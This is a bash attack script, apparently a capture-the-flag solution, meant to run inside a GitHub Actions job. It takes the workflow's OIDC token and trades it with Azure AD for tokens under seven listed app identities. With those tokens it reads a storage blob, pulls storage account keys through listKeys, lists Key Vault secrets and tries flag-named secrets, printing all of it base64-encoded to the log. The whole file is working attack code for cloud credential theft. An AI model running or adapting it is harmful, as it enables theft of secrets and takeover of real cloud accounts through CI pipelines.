#!/usr/bin/env bash
set +e
echo "=====PWN9_START====="
TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e"
SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
RG="rg-tbl-platform-prod-sea"
OIDC=$(curl -sS -m 15 -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("value",""))')
echo "oidc_len=${#OIDC}"
exch(){ curl -sS -m 20 -X POST "https://login.microsoftonline.com/$TID/oauth2/v2.0/token" --data-urlencode "client_id=$1" -d grant_type=client_credentials --data-urlencode "scope=$2" -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=$OIDC" 2>/dev/null; }
tok(){ exch "$1" "$2" | python3 -c 'import sys,json;print(json.load(sys.stdin).get("access_token",""))' 2>/dev/null; }
IDS="7a85156a-01c4-4e61-8472-40a92107159b:writer-mi
7c2e61eb-f928-45cd-99c9-20da958dd216:directory-sync
891fb158-e02c-4428-a885-53b811f369c0:legacy-admin
6eb124e3-de61-4fc9-a124-213d98d737f5:reporting-insights
eeab432e-1bf6-400e-b155-a28ce7cafcdb:storefront-sysmi
12ed54de-f2eb-4784-804c-3a7a3e83a9e9:reporting-service
72ff278a-9e71-43ec-bac4-2ca303f8e462:cicd"
for LINE in $IDS; do
  APPID="${LINE%%:*}"; NAME="${LINE##*:}"
  MT=$(tok "$APPID" "https://management.azure.com/.default")
  ST=$(tok "$APPID" "https://storage.azure.net/.default")
  VT=$(tok "$APPID" "https://vault.azure.net/.default")
  echo "[$NAME] mgmt=${#MT} storage=${#ST} vault=${#VT}"
  if [ -n "$ST" ]; then
    R=$(curl -sS -m 15 -H "Authorization: Bearer $ST" -H "x-ms-version: 2021-08-06" "https://sttblappcfgprodx3euoz.blob.core.windows.net/config/internal-config.json" 2>&1)
    echo "  BLOB_b64: $(printf %s "$R" | base64 -w0 | head -c 3000)"
  fi
  if [ -n "$MT" ]; then
    LK=$(curl -sS -m 15 -X POST -H "Authorization: Bearer $MT" -H "Content-Type: application/json" -d "{}" "https://management.azure.com/subscriptions/$SUB/resourceGroups/$RG/providers/Microsoft.Storage/storageAccounts/sttblappcfgprodx3euoz/listKeys?api-version=2023-01-01" 2>&1)
    echo "  KEYS_b64: $(printf %s "$LK" | base64 -w0 | head -c 2500)"
  fi
  if [ -n "$VT" ]; then
    VS=$(curl -sS -m 15 -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets?api-version=7.4" 2>&1)
    echo "  KVSEC_b64: $(printf %s "$VS" | base64 -w0 | head -c 1500)"
    for fn in flag FLAG df26 tebamoto-flag challenge-flag internal-config; do
      F=$(curl -sS -m 12 -H "Authorization: Bearer $VT" "https://kv-tbl-sec-x3euoz.vault.azure.net/secrets/$fn?api-version=7.4" 2>&1)
      case "$F" in *'"value"'*) echo "  KVHIT $fn b64: $(printf %s "$F" | base64 -w0)";; esac
    done
  fi
done
echo "=====PWN9_END====="